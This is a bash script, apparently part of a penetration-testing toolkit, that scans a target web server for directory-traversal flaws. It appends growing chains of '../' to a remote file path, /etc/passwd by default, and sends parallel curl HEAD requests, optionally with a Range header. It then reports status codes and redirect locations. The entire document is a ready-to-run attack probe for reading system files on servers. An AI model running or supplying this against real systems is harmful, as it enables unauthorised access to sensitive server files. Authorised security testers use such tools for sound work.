#!/bin/bash

source _flags.sh

accept-flag RHOST "-url" STRING "" "target url"
accept-flag DEPTH "-depth" INT "5" "file path depth"
accept-flag RFILE "-rfile" STRING "/etc/passwd" "remote file to check"
accept-flag RRANGE "-range" BOOL "" "use range header"
accept-flag HELP "-help" BOOL "" "usage info"
CURLOPT=$(flag-rest "$@" )
if [ "yes" == "$RRANGE" ]; then
	CURLOPT="$CURLOPT -H 'Range: bytes=0-4096'"
fi
if [ "yes" == "$HELP" ] || [ -z "$RHOST" ]; then
	usage "... the rest will be passed to curl directly.\nURL parameter is mandatory"
	exit
fi

prefix=""
for i in $(seq 1 "$DEPTH"); do
	[ -z "$prefix" ] && cmd=$RFILE || cmd=${RFILE:1}
	(
		REQUEST="${RHOST}/${prefix}${cmd}"
		res=$( curl -I $CURLOPT "$REQUEST" 2>/dev/null )
		if [ -z "$res" ]; then
			echo "Error requesting $RHOST (${REQUEST})"
			exit 1
		fi
		result=$( echo "$res" | grep '^HTTP' | tr -d '\n\r' )
		if $( echo "$result" | grep -q "30[1,2]" ); then
			location=$( echo "$res" | grep -i "location: " | tr -d '\n\r' )
			result="${result} | ${location}"
		fi
		[ -z "$result" ] || echo "${REQUEST} | ${result}"
	)&
	prefix="${prefix}../"
done
wait
